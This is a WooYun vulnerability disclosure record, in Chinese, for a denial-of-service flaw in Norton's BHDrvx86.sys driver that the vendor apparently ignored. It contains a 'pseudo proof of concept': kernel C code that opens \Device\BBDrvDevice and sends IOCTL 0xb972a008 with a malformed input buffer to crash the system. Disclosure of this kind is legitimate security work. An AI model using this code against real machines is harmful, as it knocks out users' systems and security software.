{"id": 8214, "wybug_id": "wooyun-2013-034678", "wybug_title": "诺顿BHDrvx86.sys拒绝服务漏洞(附伪POC)", "wybug_corp": "赛门铁克", "wybug_author": "n0bele", "wybug_date": "2013-08-19 14:17", "wybug_open_date": "2013-11-17 14:17", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-11-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BHDrvx86.sys一直问题不断，才修补了上一个版本，最新版的问题又来了 详细说明：  为什么叫伪POC呢？因为真POC可能得HOOK ZwDeviceIoControlFile修改值，而那样实在费力，直接ZwOpenFile \\\\Device\\\\BBDrvDevice是成功不了的，可能做了校验.我只为说明问题，所以省事点，据说不带POC不让过的.问题出在发送IO 0xb972a008的时候，inputbuffer没处理好.当然能不能提权对这个bug而言真的毫无意义了。BOOLEAN SendInterface(\t\t\t\tIN PCWSTR\tDeviceName,\t\t\t\tIN ULONG\tIoControlCode,\t\t\t\tIN PVOID\tData,\t\t\t\tIN ULONG\tDataLength\t\t\t\t){\tNTSTATUS ntStatus = STATUS_SUCCESS;\tPFILE_OBJECT pNetObject = NULL;\tOBJECT_ATTRIBUTES ObPassthru;\tIO_STATUS_BLOCK NetStatusBlock;\tUNICODE_STRING      PassthruString;\tHANDLE hNet =NULL;\tBOOLEAN\tbRet = FALSE;\t__try\t{\t\tRtlInitUnicodeString( &PassthruString, DeviceName);\t\tInitializeObjectAttributes( &ObPassthru,&PassthruString,0,(HANDLE) NULL,(PSECURITY_DESCRIPTOR)NULL);\t\tntStatus = ZwOpenFile(&hNet,OBJ_CASE_INSENSITIVE,&ObPassthru,&NetStatusBlock,0,FILE_NON_DIRECTORY_FILE);\t\tif (!NT_SUCCESS(ntStatus))\t\t{\t\t\tDbgPrint(\"[SendInterface] ZwOpenFile  failed err=[0x%08x]\\n\", ntStatus);\t\t\t__leave;\t\t}\t\tntStatus = ObReferenceObjectByHandle(hNet,0,NULL,KernelMode,(PVOID *) &pNetObject,NULL );\t\tif (!NT_SUCCESS(ntStatus))\t\t{\t\t\tDbgPrint(\"[SendInterface] ObReferenceObjectByHandle  failed err=[0x%08x]\\n\", ntStatus);\t\t\tZwClose(hNet);\t\t\t__leave;\t\t}\t\tntStatus = ZwDeviceIoControlFile(hNet,NULL,NULL,NULL,&NetStatusBlock,IoControlCode,Data,DataLength,NULL,0);\t\tObDereferenceObject(pNetObject);\t\tif (!NT_SUCCESS(ntStatus))\t\t{\t\t\tDbgPrint(\"[SendInterface] ZwDeviceIoControlFile  failed err=[0x%08x]\\n\", ntStatus);\t\t\tZwClose(hNet);\t\t\t__leave;\t\t}\t\tZwClose(hNet);\t\tbRet = TRUE;\t}\t__except(EXCEPTION_EXECUTE_HANDLER)\t{\t\tKdPrint((\"[SendInterface]Memory access failed.\"));\t}\treturn bRet;}SendInterface(L\"\\\\Device\\\\BBDrvDevice\",0xb972a008,(PVOID)0x02f0ade0,0x00000030);   漏洞证明：  \n\n   修复方案：  They understand~   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}